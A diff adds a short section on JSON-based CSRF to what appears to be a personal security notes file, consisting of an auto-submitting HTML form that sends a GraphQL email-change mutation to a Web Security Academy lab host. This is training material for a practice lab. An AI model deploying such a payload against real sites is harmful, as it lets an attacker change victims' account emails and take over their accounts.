@@ -4448,7 +4448,30 @@ RUN pip3 install -r requirements.txt
 - Using it as a module-:
 
 
+----------------------------
 
+### Submitting Json for CSRF
+
+----------------------------
+
+- Poc-:
+
+```html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://0a5e002c03f4803d8cf0f98a009b00ea.web-security-academy.net/graphql/v1" method="POST" enctype="text/plain">
+      <input type="hidden" name="query" value='mutation { changeEmail(input: { email: "wiener@normal-user.net" }) { email } }' />
+      <input type="submit" id="send">
+    </form>
+    <script>
+     document.getElementById("send").click();
+    </script>
+  </body>
+</html>
+```
+
+------------------------
 
 
 
